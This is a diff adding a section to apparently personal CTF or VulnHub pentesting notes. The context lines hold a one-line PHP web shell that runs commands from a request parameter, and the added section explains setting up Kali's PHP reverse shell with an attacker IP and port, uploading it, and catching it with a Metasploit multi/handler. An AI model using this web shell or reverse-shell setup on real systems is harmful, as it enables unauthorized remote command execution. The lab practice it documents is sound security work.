@@ -122,6 +122,37 @@ https://gist.github.com/sente/4dbb2b7bdda2647ba80b
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
+### Using reverse shell with metasploit
+
+Kali has some reverse shells for php: `/usr/share/webshells/php`, ex: `php-reverse-shell.php`
+
+Change in that script the following lines:
+
+```php
+$ip = '192.168.1.159';  // CHANGE THIS your IP, not VM ip
+$port = 55555;       // CHANGE THIS your PORT(where the metasploit will listen)
+```
+
+Upload file to VM.
+
+Open metasploit:
+
+```bash
+msfconsole
+
+msf > use multi/handler
+msf exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+# Output: payload => linux/x86/shell/reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.1.159
+# Output: LHOST => 192.168.1.159
+msf exploit(multi/handler) > set LPORT 55555
+# Output: LPORT => 55555
+msf exploit(multi/handler) > exploit
+```
+
+Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.
+
+
 ## WalkThroughs
 
  - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
